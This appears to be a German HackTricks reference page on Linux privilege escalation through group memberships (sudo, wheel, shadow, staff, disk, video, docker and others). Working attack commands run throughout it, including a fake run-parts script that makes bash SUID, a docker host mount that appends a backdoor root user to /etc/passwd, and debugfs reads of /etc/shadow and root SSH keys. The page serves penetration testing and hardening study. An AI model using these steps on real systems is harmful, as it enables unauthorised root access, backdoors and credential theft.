# Interessante Gruppen - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin-Gruppen

### **PE - Methode 1**

**Manchmal** enthält die **/etc/sudoers**-Richtlinie eines Systems (oder eine darin eingebundene Datei) Einträge wie:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass jeder Benutzer, auf den einer der beiden Einträge zutrifft, jeden Befehl als beliebiger Zielbenutzer über `sudo` ausführen darf (vorbehaltlich der übrigen Richtlinie).<sup>[[3]](#references)</sup>

Falls dies der Fall ist, kannst du **einfach den folgenden Befehl ausführen, um root zu werden**:
```
sudo su
```
### PE - Methode 2

Finde alle SUID-Binaries und prüfe, ob das Binary **Pkexec** vorhanden ist:
```bash
find / -perm -4000 2>/dev/null
```
Wenn **pkexec ein SUID binary** ist, kann es ein Programm als ein anderer Benutzer ausführen, jedoch nur, wenn polkit die angeforderte Aktion autorisiert; das SUID-Bit allein garantiert keine root-Rechte. Überprüfe die installierte Policy und die Autorisierung der Ziel-Session, anstatt davon auszugehen, dass die Mitgliedschaft in **sudo** oder **admin** ausreicht.<sup>[[4]](#references)[[5]](#references)</sup>

Auf Distributionen, die noch das ältere Local Authority backend verwenden, überprüfe dessen Gruppenregeln mit:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Die relevanten Gruppennamen und Standardeinstellungen variieren je nach Distribution; eine Gruppe ist hier nur dann nützlich, wenn die lokale Richtlinie sie ausdrücklich nennt.<sup>[[5]](#references)</sup>

Um **root zu werden, kannst du ausführen**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
Wenn du versuchst, **pkexec** auszuführen, und diesen **Fehler** erhältst:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
In einer SSH-Sitzung ohne registrierten Authentication Agent kann `pkexec` mit diesem Fehler fehlschlagen, selbst wenn die Policy die Aktion ansonsten erlauben würde; polkit dokumentiert `pkttyagent` als textbasierten Authentication Agent für Sitzungen außerhalb der Desktop-Umgebung. Das genaue Verhalten hängt von der Version und Distribution ab. Überprüfe daher die lokale Policy und die Agent-Konfiguration. Ein für betroffene NixOS-Versionen berichteter Workaround verwendet **2 verschiedene SSH-Sitzungen**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

Manchmal kann eine sudoers-Richtlinie auch folgenden Eintrag enthalten:
```
%wheel	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass jeder Benutzer, auf den der Eintrag zutrifft, über `sudo` jeden beliebigen Befehl als jeder beliebige Zielbenutzer ausführen darf (vorbehaltlich der übrigen Richtlinie).<sup>[[3]](#references)</sup>

Wenn dies der Fall ist, kannst du **einfach Folgendes ausführen, um root zu werden**:
```
sudo su
```
## Shadow Group

Auf Systemen, deren Berechtigungen dies erlauben, können Benutzer in der **shadow**-Gruppe **/etc/shadow** **lesen**; überprüfe den tatsächlichen Modus und die ACLs auf dem Zielsystem:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Also, lies die Datei und versuche, einige **Hashes zu cracken**.

Wichtige Feinheit zum Sperrstatus bei der Triage von Hashes:
- Einträge mit `!` oder `*` sind für Passwort-Logins im Allgemeinen nicht interaktiv.
- `!hash` bedeutet, dass das Passwort gesperrt wurde; die verbleibenden Zeichen stellen das Passwortfeld vor der Sperrung dar.
- Ein Feld mit `*` ist kein gültiger `crypt(3)`-Hash und verhindert die UNIX-Passwortanmeldung; daraus sollte nicht abgeleitet werden, ob zuvor ein Passwort gesetzt war.
Dies ist auch dann für die Kontoklassifizierung nützlich, wenn der direkte Login blockiert ist.<sup>[[6]](#references)</sup>

## Staff-Gruppe

**staff**: Ermöglicht es Benutzern, lokale Änderungen am System (`/usr/local`) vorzunehmen, ohne Root-Berechtigungen zu benötigen (beachte, dass sich ausführbare Dateien in `/usr/local/bin` in der PATH-Variable jedes Benutzers befinden und möglicherweise die gleichnamigen ausführbaren Dateien in `/bin` und `/usr/bin` „überschreiben“). Vergleiche dies mit der Gruppe „adm“, die sich eher auf Monitoring/Sicherheit bezieht.<sup>[[2]](#references)[[7]](#references)</sup>

Bei Debian-Konfigurationen, in denen `/usr/local/bin` in `PATH` vor `/usr/bin` steht (wie in den folgenden Beispielen), wird ein nicht vollqualifizierter Befehl zuerst zur Kopie in `/usr/local/bin` aufgelöst; bestätige den effektiven `PATH` auf dem Zielsystem.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Wenn ein privilegierter Prozess einen nicht vollqualifizierten Befehl über ein beschreibbares `/usr/local/bin` auflöst, kann das Ersetzen dieses Befehls mit den Privilegien des Prozesses ausgeführt werden; bestätige vor dem Testen den tatsächlichen Pfad und den Auslöser.

Auf Ubuntu-Systemen führt `pam_motd` bei der Anmeldung ausführbare Skripte über `run-parts --lsbsysinit` als root aus; auch cron-Jobs können `run-parts` verwenden, dies ist jedoch distributions- und konfigurationsabhängig.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Bei einer neuen SSH-Anmeldung kann `pspy` dabei helfen zu bestätigen, ob dieser Pfad auf dem Ziel tatsächlich aufgerufen wird; es kann Prozessbefehlszeilen ohne Root-Rechte beobachten.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk-Gruppe

Die Mitgliedschaft in der **disk**-Gruppe kann direkten Zugriff auf Blockgeräte gewähren und kommt häufig **Root-Zugriff sehr nahe**. Debian beschreibt sie als größtenteils gleichwertig mit Root-Zugriff; überprüfe jedoch die tatsächlichen Geräteberechtigungen und das Speicherlayout auf dem Zielsystem.<sup>[[7]](#references)</sup>

Übliche Gerätepfade umfassen `/dev/sd*`, aber NVMe- und andere Speicherlayouts verwenden andere Namen.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` arbeitet mit ext2/ext3/ext4-Dateisystemen; Pfade wie `/root` und `/etc/shadow` oben sind Dateien innerhalb des geöffneten Dateisystems, während das zweite Argument von `dump` ein Ausgabepfad im nativen Dateisystem ist.<sup>[[8]](#references)</sup> Beispielsweise wird dadurch `/tmp/asd1.txt` aus dem geöffneten Dateisystem nach `/tmp/asd2.txt` im nativen Dateisystem extrahiert:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Die Option `-w` öffnet das Dateisystem mit Lese- und Schreibzugriff, und der Befehl `write` kopiert eine native Datei in das geöffnete Dateisystem. Vermeide die Verwendung auf einem eingebundenen Live-Dateisystem, da direkte Bearbeitungen das Dateisystem beschädigen können; arbeite nach Möglichkeit mit einem Offline-Image.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Video-Gruppe

Mit dem Befehl `w` können Sie herausfinden, **wer am System angemeldet ist**. Dabei wird eine Ausgabe wie die folgende angezeigt.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Der Eintrag **tty1** identifiziert die erste virtuelle Linux-Konsole; er beweist nicht automatisch, dass sich ein Benutzer physisch am Rechner befindet, insbesondere nicht in Containern oder anderen Umgebungen.<sup>[[21]](#references)</sup>

Auf Systemen, die ein lesbares Framebuffer-Gerät bereitstellen, kann die Mitgliedschaft in der Gruppe **video** Zugriff auf dieses Gerät gewähren. Die Linux-Framebuffer-Schnittstelle dokumentiert `/dev/fb0` als lesbares Speichergerät, das für eine Bildschirmaufnahme kopiert werden kann; der Pfad `/sys/class/graphics/fb0/virtual_size` ist nur verfügbar, wenn dieses fbdev-sysfs-Attribut vorhanden ist. Prüfe daher zuerst das Zielsystem.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Wenn die installierte **GIMP**-Version einen Importer für Rohdaten bereitstellt, öffne **`screen.raw`** mit diesem Importer; Unterstützung und Steuerelemente variieren je nach Version und Plug-in.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Um das Raw-Bild zu öffnen, kannst du GIMP verwenden, die Datei screen.raw auswählen und als Dateityp Raw image data auswählen](<../../../images/image (463).png>)

Setze die Bildbreite und -höhe passend zur Framebuffer-Geometrie; probiere die verfügbaren Pixelformate/Bildtypen aus, bis die Ausgabe lesbar ist.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Ändere anschließend Width und Height auf die auf dem Bildschirm verwendeten Werte und probiere verschiedene Image Types aus (wähle den Typ aus, der den Bildschirm am besten darstellt)](<../../../images/image (317).png>)

## Root-Gruppe

Die Mitgliedschaft in der **root**-Gruppe verleiht nicht die UID von root, aber von `root` besessene, gruppenschreibbare Dateien können dennoch interessant sein, wenn privilegierte Dienste oder Bibliotheken sie verwenden. Überprüfe die tatsächlichen Berechtigungen der Datei und ihre Verwendung, bevor du sie als möglichen Pfad zur Privilege Escalation behandelst.

**Überprüfe, welche Dateien Mitglieder der root-Gruppe ändern können**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker-Gruppe

Die Mitgliedschaft in der Gruppe `docker` gewährt bei standardmäßigen rootful-Installationen Zugriff auf den Docker-Daemon mit Root-Rechten. Da Bind-Mounts standardmäßig Lese- und Schreibzugriff erlauben, kann ein Benutzer, der diesen Daemon kontrollieren kann, das `/`-Verzeichnis des Hosts in einen Container mounten und Dateien auf dem Host ändern; dadurch erhält er effektiv Root-Rechte auf dem Host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Schließlich kannst du, wenn dir keine der vorherigen Vorschläge zusagen oder sie aus irgendeinem Grund nicht funktionieren (Docker-API-Firewall?), immer versuchen, **einen privilegierten Container auszuführen und daraus auszubrechen**, wie hier erklärt:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Wenn du Schreibberechtigungen für den Docker-Socket hast, lies [**diesen Beitrag darüber, wie man durch Missbrauch des Docker-Sockets Privilegien eskaliert**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

Normalerweise haben **Mitglieder** der Gruppe **`adm`** Berechtigungen zum **Lesen von Log**-Dateien innerhalb von _/var/log/_.\
Wenn du daher einen Benutzer innerhalb dieser Gruppe kompromittiert hast, solltest du dir unbedingt **die Logs ansehen**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Diese Gruppen haben dienst- und distributionsspezifische Bedeutungen. Debian dokumentiert `backup` für delegierte Backup-/Wiederherstellungsvorgänge, `lp` für Drucker-Daemons und `mail` für `/var/mail`. Überprüfe daher die lokalen Berechtigungen, bevor du die Mitgliedschaft als möglichen Privilege-Pfad behandelst.<sup>[[7]](#references)</sup>

Sie sind häufig Vektoren zur **Credential-Ermittlung** und keine direkten Root-Vektoren:
- **backup**: Kann Archive mit Konfigurationen, Schlüsseln, DB-Dumps oder Tokens offenlegen.
- **operator**: Plattformabhängiger operativer Zugriff, durch den sensible Laufzeitdaten geleakt werden können.
- **lp**: Druckerwarteschlangen und -Spools können Dokumentinhalte enthalten.
- **mail**: Mail-Spools können Reset-Links, OTPs und interne Credentials offenlegen.

Behandle die Mitgliedschaft in diesen Gruppen als wichtigen Fund zur Datenpreisgabe und führe einen Pivot über die Wiederverwendung von Passwörtern/Tokens durch.

## Auth group

Unter OpenBSD gehört `/etc/skey` bei konfiguriertem S/Key `root:auth`, und der Zugriff auf seine Datensätze erfordert die Gruppe `auth`; YubiKey-Datensätze werden in `/var/db/yubikey` gespeichert.<sup>[[16]](#references)[[17]](#references)</sup> Eine verwundbare OpenBSD-6.6-Konfiguration mit aktiviertem S/Key oder YubiKey ermöglichte es lokalen Benutzern mit `auth`-Berechtigungen, Root zu werden. Qualys dokumentiert die Voraussetzung und die Exploit-Kette, und der verlinkte PoC implementiert sie.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [pkexec/pkttyagent-Authentifizierung ohne GUI-Sitzung (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Referenzhandbuch](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Referenzhandbuch](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Handbuch zur Absicherung von Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux-Handbuchseite](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Das Framebuffer-Gerät — Dokumentation des Linux-Kernels](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu-Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivilegiertes Linux-Prozess-Snooping](https://github.com/DominicBreuker/pspy)
- [13] [Sicherheit der Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Docker als Nicht-Root-Benutzer verwalten](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Container ausführen — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD-Handbuchseiten](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD-Handbuchseiten](https://man.openbsd.org/login_yubikey.8)
- [18] [Authentifizierungsschwachstellen in OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — lokaler Exploit-PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Von Linux zugewiesene Geräte (Version 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Bildimport und -export — GIMP-Dokumentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
